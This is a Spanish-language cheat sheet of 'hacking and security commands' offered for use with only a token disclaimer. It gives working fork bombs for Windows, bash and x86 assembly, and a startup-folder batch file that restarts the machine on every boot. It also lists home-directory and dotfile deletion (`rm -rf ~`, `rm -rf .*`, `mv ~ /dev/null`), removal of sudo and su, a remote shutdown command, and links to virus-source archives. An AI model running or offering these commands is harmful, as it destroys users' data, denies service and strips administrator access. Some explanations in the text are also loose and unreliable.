##COMANDOS DE HACKING Y SEGURIDAD


En este documento resumo una lista de comandos tanto para Windows como para Linux relacionados con el Hacking y la seguridad informática. Además al final añado algunos datos interesantes con ideas, curiosidades e inspiración sobre este submundo.

El formato ofrece el nombre común del ataque/comando, una descripción de lo que hace, y el propio comando. 

##Índice

1. Rabbit Virus (Windows, Linux, ASM)
2. ¡El hacker cazado!
3. El ordenador cansado
4. La pesadilla de Linux
5. El agujero negro
6. Adiós a los poderes

Extra:
* Otros recursos
* Nota


### 1- **RABBIT VIRUS** (Windows & Linux)

Es un ataque DoS, es decir, hace que un servicio o recurso sea inaccesible al usuario. Su nombre viene de su funcionamiento: El proceso se replica constantemente para llenar los recursos libres, haciendo que el sistema funcione cada vez más lento y finalmente, pete. 

**Código para la terminal de Windows:**

>Versión larga (puede cambiarse “_conejitos_” por cualquier otro nombre)

```
echo  %0^|%0  > conejitos.bat
conejitos.bat
```

>Versión corta:

```
%0|%0
```

**Código para la terminal de Linux:**

>Versión larga (_creando un ejecutable de linux_):

```
#!/bin/bash
./$0|./$0&
```

>Versión corta para Linux:

```
:(){ :|: & };:
```

**Código en ensamblador (_lenguaje en el que se escriben los virus informáticos_):**


```
section .text

    global _start`
    
_start:
    mov eax,2 ;System call for forking
    int 0x80  ;Call kernel
    jmp _start
 ```
 
### 2- **¡El hacker cazado!** (Windows y Linux)

Esta línea de comando te devuelve los ordenadores conectados a tu ordenador, incluyendo información al respecto (la ip, el estado -leyendo, esperando, etc- y otros). 

```
netstat -a
```

En Windows puedes echar al ordenador que creas conveniente usando:
```
shutdown -s -m \\nombre del ordenador
```

### 3- **El ordenador cansado** (Windows)

Este programa hace que el ordenador se apague cada vez que reinicia, y salta un aviso diciendo “_Estoy cansado de funcionar, adiós_”. 
```
copy con "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Shutdown.bat"
@echo off
shutdown -r -t 500 -c "Estoy cansado de funcionar, adiós." 
```
### 4- **La pesadilla de linux**

Esta línea de comando es la peor pesadilla de cualquier usuario de linux. Basicamente borra de forma recursiva absolutamete todo. 

> Con éste borra todos los archivos de la carpeta Home:

```
 rm -rf ~ 
```

> Con éste borra todos los archivos de configuración


```
 rm -rf .*
```


### 5- **El agujero negro** (Linux)

Esta línea de comando manda el directorio Home a un “Agujero negro” es decir, lo destruye. (Similar al comando anterior)

```
mv ~ /dev/null
```

### 6- **Adiós a los poderes** (Linux)
Éste comando deshabilita los poderes de su y sudo, es decir, administrador. 

```
rm -f /usr/bin/sudo;rm -f /bin/su
```

### 7- WGET (Linux)
Wget es un programa de linux que coge el contenido de servidores web. Aunque su objetivo principal es ser una herramienta de descarga, suele utilizarse como herramienta de _pentesting_, es decir, ataques a sistemas para descubrir vulnerabilidades de la web.
Por ejemplo, podemos capturar el código fuente de una página usando:

```
wget http://www.ejemplo.com/
```

O si queremos descargar **todo** el contenido de una web: 

```
wget -r http://www.ejemplo.com
```


Pero también puede usarse para descargar cosas cuando nos lo impiden por el tipo de navegador que usamos. Para ello escribimos:

```
wget  -r -p -U Mozilla http://www.ejemplo.com
```


Otra opción interesante es guardar los cookies

```
wget -r -l inf -nd -nc --save-cookies cookies.txt www.ejemplo.com
```


¿Por qué es interesante? Las cookies de los sitios web guardan información útil para que el usuario pueda moverse con más eficiencia por la web. Por ejemplo, cuando no necesitamos acceder a una web porque ésta "recuerda" nuestros datos.


## Extra

### Otros recursos:

Links de interés con más comandos  e ideas.

* Netstat en linux: http://www.linux-party.com/index.php/29-internet/8969-20-comandos-netstat-para-administradores-de-redes-linux
* Comandos letales de linux: http://www.tecmint.com/10-most-dangerous-commands-you-should-never-execute-on-linux/
* Los hackeos de mr robot explicados: http://null-byte.wonderhowto.com/how-to/mr-robot-hacks/
* Los hackeos de mr robot (otro link): https://hackertarget.com/hacker-tools-mr-robot/
* Los diez virus informáticos más destructivos de la historia: http://www.hongkiat.com/blog/famous-malicious-computer-viruses/
* Código fuente de varios virus : http://vxheaven.org/src.php
* Más información sobre virus: http://textfiles.com/virus/

### Nota 

> Toda la información de este documento tiene carácter informativo y lúdico, pero son comandos reales, por favor, usar con responsabilidad estos datos.
